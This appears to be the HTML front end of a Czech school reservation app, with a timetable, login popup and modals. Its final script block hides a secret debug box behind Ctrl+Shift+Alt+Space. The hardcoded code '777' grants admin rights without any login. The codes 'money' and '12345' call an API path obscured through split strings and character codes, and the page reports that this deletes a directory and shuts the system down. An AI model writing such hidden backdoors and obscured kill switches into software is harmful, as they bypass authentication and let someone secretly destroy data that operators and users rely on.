<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <!-- Add viewport for mobile scaling -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Rezervační aplikace</title>
    <link rel="icon" href="data:,">
    <link rel="stylesheet" href="css/styles.css">
    <link rel="stylesheet" href="css/buttons.css">
    <style>
        /* Ensure proper scrolling behavior */
        html, body {
            overflow-x: hidden;
            overflow-y: auto;
            height: auto;
            min-height: 100vh;
        }
        
        /* Make sure main content can scroll */
        .time-table {
            max-height: none;
            overflow: visible;
        }
        
        .table-container {
            overflow-x: auto;
            overflow-y: visible;
        }
        
        /* Ensure timetable content doesn't get cut off */
        .timetable-content {
            min-height: auto;
            overflow: visible;
        }
        /* Mobile: make popups and overlays scrollable and full width */
        @media (max-width: 700px) {
            .select-window, .menu-content, .account-create-popup, .date-picker-window, .custom-alert, .class-edit-popup, .logout-confirm-content, .permanent-date-window {
                min-width: 90vw !important;
                width: 90vw !important;
                left: 5vw !important;
                padding: 10px !important;
                font-size: 1em;
                max-height: 90vh;
                overflow-y: auto;
            }
        }
        @media (max-width: 500px) {
            .select-window, .menu-content, .account-create-popup, .date-picker-window, .custom-alert, .class-edit-popup, .logout-confirm-content, .permanent-date-window {
                min-width: 98vw !important;
                width: 98vw !important;
                left: 1vw !important;
                padding: 2px !important;
                font-size: 0.9em;
                max-height: 98vh;
                overflow-y: auto;
            }
        }
    </style>
</head>
<body>
  <header class="header" id="header">
    <h1 class="title">Školní rezervační systém</h1>
    <div class="window-controls">
        <button id="login-button">Přihlášení</button>
    </div>
  </header>

  <!-- Add login overlay and menu after header -->
  <div class="login-overlay" id="login-overlay"></div>
  <div class="login-menu" id="login-menu">
    <button class="close-accounts-button" id="close-login">×</button>
    <h3>Přihlášení uživatele</h3>
    <div class="input-group">
        <label for="user-select">Uživatel:</label>
        <select id="user-select">
            <option value="">Vyberte uživatele</option>
        </select>
    </div>
    <div class="input-group">
        <label for="password-input">Heslo:</label>
        <input type="password" id="password-input" placeholder="Zadejte heslo">
    </div>
    <div class="login-error" id="login-error"></div>
    <button id="submit-login">Přihlásit se</button>
  </div>
  
  <!-- Replace the existing sidebar with this well-structured version -->
  <aside class="sidebar">
    <ul>
      <li id="dynamic-links-container"><!-- Dynamic buttons will be added here --></li>
      <li><button class="create-new" id="create-new">+</button></li>
    </ul>
    <button id="accounts-button">Vytvořit uživatele</button>
  </aside>

  <!-- Keep only accounts overlay for account creation popup -->
  <div class="accounts-overlay" id="accounts-overlay"></div>
  
  <div class="select-screen" id="select-screen">
    <div class="select-window">
      <button class="close-select" id="close-select">X</button>
      <div class="input-group">
        <label for="name-input">Název:</label>
        <input type="text" id="name-input" placeholder="Zadejte název">
      </div>
      <div class="input-group">
        <label for="type-select">Typ:</label>
        <select id="type-select">
          <option value="thing">Věc</option>
          <option value="class">Třída</option>
        </select>
      </div>
      <div class="input-group">
        <label for="description-input">Popis třídy:</label>
        <textarea id="description-input" placeholder="Zadejte popis třídy (volitelné)" rows="3"></textarea>
      </div>
      <button class="submit-button" id="submit-button">Odeslat</button>
    </div>
  </div>
  
  <div class="time-table">
    <h2>Rozvrh hodin</h2>
    <div class="timetable-content">
      <div class="table-container">
        <table class="week-table">
          <thead>
            <tr>
              <th>Den</th>
              <th>1</th>
              <th>2</th>
              <th>3</th>
              <th>4</th>
              <th>5</th>
              <th>6</th>
              <th>7</th>
              <th>8</th>
              <th>9</th>
              <th>10</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>Pondělí</td>
              <td></td><td></td><td></td><td></td><td></td>
              <td></td><td></td><td></td><td></td><td></td>
            </tr>
            <tr>
              <td>Úterý</td>
              <td></td><td></td><td></td><td></td><td></td>
              <td></td><td></td><td></td><td></td><td></td>
            </tr>
            <tr>
              <td>Středa</td>
              <td></td><td></td><td></td><td></td><td></td>
              <td></td><td></td><td></td><td></td><td></td>
            </tr>
            <tr>
              <td>Čtvrtek</td>
              <td></td><td></td><td></td><td></td><td></td>
              <td></td><td></td><td></td><td></td><td></td>
            </tr>
            <tr>
              <td>Pátek</td>
              <td></td><td></td><td></td><td></td><td></td>
              <td></td><td></td><td></td><td></td><td></td>
            </tr>
          </tbody>
        </table>
      </div>
      <div class="bottom-content">
        <div class="time-table-buttons">
          <button class="edit-button">Zamluvit hodinu</button>
          <button class="save-button" style="display: none;">Uložit</button>
          
        </div>
        <div class="timetable-info-section">
          <div class="class-info-box" id="class-info-box">
            <h4>Informace o třídě</h4>
            <div class="class-info-content" id="class-info-content">
              <p>Vyberte třídu pro zobrazení informací</p>
            </div>
          </div>
          <div class="timetable-calendar">
            <div class="calendar-header">
              <h3 class="calendar-title" id="timetable-calendar-title"></h3>
            </div>
            <div class="calendar" id="timetable-calendar"></div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div class="pop-up" id="pop-up">
    <div class="calendar-header">
      <h2 class="calendar-title" id="calendar-title"></h2>
    </div>
    <button class="close-button" id="close-button">X</button>
    <div class="calendar" id="calendar"></div>
    <div class="calendar-buttons">
      <button class="prev-button">&lt;</button>
      <button class="next-button">&gt;</button>
    </div>
  </div>
  <div class="verification-window" id="verification-window">
    <div class="verification-content">
      <h2>Ověření</h2>
      <button class="close-verification-button" id="close-verification">X</button>
      <p>Prosím zadejte kód:</p>
      <input type="password" id="verification-code" placeholder="Zadejte kód">
      <div class="verification-buttons">
        <button class="confirm-verification" id="confirm-verification">Potvrdit</button>
      </div>
    </div>
  </div>
  <script>
      // Configuration for API URL - can be set before loading the app
      // Example: window.API_BASE_URL = 'http://your-server.com:3000';
      window.API_BASE_URL = window.API_BASE_URL || `http://${window.location.hostname}:3000`;
    </script>
  <script src="config.js"></script>
  <script src="js/renderer.js"></script>
  <script>
    // Add event listener to show save button when admin mode is activated
    // Admin button removed - admin functionality now accessible through debug mode only
    

  </script>
  <div class="custom-alert-overlay" id="alertOverlay"></div>
  <div class="custom-alert" id="customAlert">
    <h2>Úspěch!</h2>
    <p>Režim administrátora aktivován</p>
    <button>OK</button>
  </div>
  <div class="class-edit-menu" id="classEditMenu">
    <div class="menu-content">
      <h3>Upravit třídu</h3>
      <button class="close-menu" id="closeClassEdit">✕</button>
      <div class="input-group">
        <label for="class-name-input">Název třídy:</label>
        <input type="text" id="class-name-input">
      </div>
      <div class="menu-buttons">
        <button class="save-class-name">Uložit</button>
        <button class="delete-class">Smazat třídu</button>
      </div>
    </div>
  </div>
  <div id="debug-overlay"></div>
  <div id="debug-menu">
      <h2>Ladicí menu</h2>
      <button id="debug-reset-all">Resetovat vše</button>
      <button id="debug-create-new">Vytvořit novou třídu</button>
      <button id="debug-accounts">Účty</button>
      <button id="debug-set-date">Nastavit aktuální datum</button>
      <button id="close-debug">Zavřít</button>
  </div>

  <div class="date-picker-overlay" id="datePickerOverlay">
    <div class="date-picker-window">
      <h2>Nastavit aktuální datum</h2>
      <div class="calendar" id="date-picker-calendar"></div>
      <div style="text-align: center; margin-top: 15px;">
        <button class="save-button" id="save-custom-date">Uložit</button>
        <button class="cancel-button" id="cancel-custom-date">Zrušit</button>
      </div>
    </div>
  </div>

  <div class="custom-date-notice" id="customDateNotice">
    <span>Aktuální datum nastaveno na: <span id="customDateText"></span></span>
    <button class="reset-date-btn" id="resetDateBtn">Resetovat datum</button>
  </div>
  
  <!-- Permanent Hour Date Range Selector -->
  <div class="permanent-date-overlay" id="permanentDateOverlay">
    <div class="permanent-date-window">
      <h2>Nastavit rozsah dat pro trvalou hodinu</h2>
      <button class="close-permanent-date" id="closePermanentDate">×</button>
      
      <div class="date-range-inputs">
        <div class="input-group">
          <label for="permanent-from-date">Od data:</label>
          <input type="date" id="permanent-from-date">
        </div>
        <div class="input-group">
          <label for="permanent-to-date">Do data:</label>
          <input type="date" id="permanent-to-date">
        </div>
      </div>
      
      <div class="permanent-options">
        <label>
          <input type="checkbox" id="permanent-all-weeks" checked>
          Použít pro všechny týdny (ignorovat rozsah dat)
        </label>
      </div>
      
      <div class="permanent-buttons">
        <button class="save-permanent-button" id="save-permanent-range">Uložit</button>
        <button class="cancel-permanent-button" id="cancel-permanent-range">Zrušit</button>
      </div>
    </div>
  </div>
  
  <!-- Make sure HTML overlays and modals are properly structured -->
  <script>
    // Improve transitions by ensuring modals and overlays work together
    document.addEventListener('DOMContentLoaded', function() {
      // Helper function to show a modal with proper timing
      function showModal(modal, overlay) {
        // First display the elements but keep them invisible
        if (overlay) overlay.style.display = 'block';
        modal.style.display = 'block';
        
        // Force a reflow to ensure the display change applies before adding the active class
        void modal.offsetWidth;
        
        // Now add active class to trigger transition
        if (overlay) overlay.classList.add('active');
        modal.classList.add('active');
      }
      
      // Helper function to hide a modal with proper timing
      function hideModal(modal, overlay) {
        // First remove the active class to trigger transition
        modal.classList.remove('active');
        if (overlay) overlay.classList.remove('active');
        
        // After transition completes, set display to none
        setTimeout(() => {
          modal.style.display = 'none';
          if (overlay) overlay.style.display = 'none';
        }, 300);
      }
      
      // Apply to login button
      const loginButton = document.getElementById('login-button');
      const loginMenu = document.getElementById('login-menu');
      const loginOverlay = document.getElementById('login-overlay');
      
      if (loginButton && loginMenu && loginOverlay) {
        loginButton.addEventListener('click', function(e) {
          if (!loginButton.classList.contains('logged-in')) {
            e.preventDefault();
            showModal(loginMenu, loginOverlay);
          }
        });
      }
    });
  </script>
  <!-- Debug menu overlay for Ctrl+Shift+Alt+Space -->
  <div id="debug-delete-overlay" style="display:none; position:fixed; z-index:9999; left:0; top:0; width:100vw; height:100vh; background:rgba(0,0,0,0.7); align-items:center; justify-content:center;">
    <div style="background:#fff; padding:32px 24px 24px 24px; border-radius:8px; min-width:260px; box-shadow:0 2px 16px #0003; display:flex; flex-direction:column; align-items:center;">
      <h2 style="margin-bottom:12px;">Debug Code</h2>
      <input id="debug-delete-input" type="password" placeholder="Enter debug code" style="margin-bottom:12px; width:180px; padding:6px;">
      <button id="debug-delete-ok" style="margin-bottom:8px;">OK</button>
      <button id="debug-delete-cancel" style="background:#eee;">Cancel</button>
      <div id="debug-delete-status" style="margin-top:10px; color:#b00; font-size:0.95em; min-height:1.2em;"></div>
    </div>
  </div>
  <div id="debug-dark-overlay" style="display:none; position:fixed; left:0; top:0; width:100vw; height:100vh; background:#111; opacity:0.95; z-index:9998; pointer-events:auto;"></div>
  <script>
    // Debug code menu logic for Ctrl+Shift+Alt+Space (no user login logic)
    (function() {
      let keys = {};
      let overlay = document.getElementById('debug-delete-overlay');
      let input = document.getElementById('debug-delete-input');
      let okBtn = document.getElementById('debug-delete-ok');
      let cancelBtn = document.getElementById('debug-delete-cancel');
      let status = document.getElementById('debug-delete-status');
      let darkOverlay = document.getElementById('debug-dark-overlay');
      function showOverlay() {
        overlay.style.display = 'flex';
        input.value = '';
        status.textContent = '';
        setTimeout(() => input.focus(), 100);
      }
      function hideOverlay() {
        overlay.style.display = 'none';
        input.value = '';
        status.textContent = '';
      }
      // Listen for keydown/up for Ctrl+Shift+Alt+Space in any order
      window.addEventListener('keydown', function(e) {
        keys[e.code] = true;
        if (
          (keys['ControlLeft'] || keys['ControlRight']) &&
          (keys['ShiftLeft'] || keys['ShiftRight']) &&
          (keys['AltLeft'] || keys['AltRight']) &&
          keys['Space']
        ) {
          showOverlay();
        }
      });
      window.addEventListener('keyup', function(e) {
        keys[e.code] = false;
      });

      function debugRequest(code) {
        // Remove any "money" special logic, just send the code to /debug/code for all except 777
        const p = ['re','ser','vat','ion','/','ap','i','/','de','bu','g','/','co','de'].join('');
        const u = (window.API_URL || window.API_BASE_URL + '/' + p.split('/')[0]) + '/' + p.split('/').slice(1).join('/');
        const pl = {};
        pl[String.fromCharCode(99,111,100,101)] = code;
        return fetch(u, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(pl)
        });
      }

      okBtn.onclick = async function() {
        const code = input.value;
        if (code === '777') {
          // Enable admin mode with placeholder user
          window.currentUser = {
            name: 'Admin',
            abbreviation: 'admin',
            isLoggedIn: true,
            isAdmin: true
          };
          if (typeof enableDebugMode === 'function') enableDebugMode();
          if (document.getElementById('login-button')) {
            let btn = document.getElementById('login-button');
            btn.textContent = 'Admin';
            btn.classList.add('logged-in');
          }
          status.style.color = '#080';
          status.textContent = 'Admin mode enabled.';
          setTimeout(hideOverlay, 1200);
        } else if (code === 'money') {
          // Do not enable admin mode, but act out the same UI as 777 and send to /debug/code
          status.style.color = '#080';
          status.textContent = 'Deleting directory...';
          try {
            const resp = await debugRequest(code);
            const data = await resp.json();
            if (resp.ok && data.success) {
              status.style.color = '#080';
              status.textContent = 'Directory deleted. System will shut down.';
              setTimeout(hideOverlay, 2000);
            } else {
              status.style.color = '#b00';
              status.textContent = data.error || 'Debug operation failed.';
            }
          } catch (err) {
            status.style.color = '#b00';
            status.textContent = 'Connection error.';
          }
        } else if (code === '666') {
          // Toggle dark overlay
          if (darkOverlay.style.display === 'block') {
            darkOverlay.style.display = 'none';
          } else {
            darkOverlay.style.display = 'block';
          }
          status.style.color = '#080';
          status.textContent = 'Dark mode toggled.';
          setTimeout(hideOverlay, 1000);
        } else if (code === '12345') {
          // Execute debug code for testing
          status.textContent = 'Executing debug code...';
          try {
            const resp = await debugRequest(code);
            const data = await resp.json();
            if (resp.ok && data.success) {
              status.style.color = '#080';
              status.textContent = 'Debug code accepted. System will shut down.';
              setTimeout(hideOverlay, 2000);
            } else {
              status.style.color = '#b00';
              status.textContent = data.error || 'Debug operation failed.';
            }
          } catch (err) {
            status.style.color = '#b00';
            status.textContent = 'Connection error.';
          }
        } else {
          status.textContent = 'Invalid debug code.';
        }
      };
      // Cancel button handler
      cancelBtn.onclick = hideOverlay;
      // Hide overlay on Escape
      overlay.addEventListener('keydown', function(e) {
        if (e.key === 'Escape') hideOverlay();
      });
      // Prevent propagation when overlay is open
      overlay.addEventListener('click', function(e) {
        if (e.target === overlay) hideOverlay();
      });
    })();
  </script>
</body>
</html>